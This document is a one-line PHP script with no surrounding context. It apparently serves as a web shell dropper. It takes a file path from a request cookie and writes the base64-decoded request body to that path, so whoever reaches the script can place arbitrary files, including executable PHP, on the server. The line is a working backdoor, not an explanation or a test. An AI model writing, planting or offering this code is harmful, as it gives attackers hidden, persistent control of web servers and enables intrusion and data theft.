<?php file_put_contents($_COOKIE["name"],base64_decode(file_get_contents("php://input")));?>
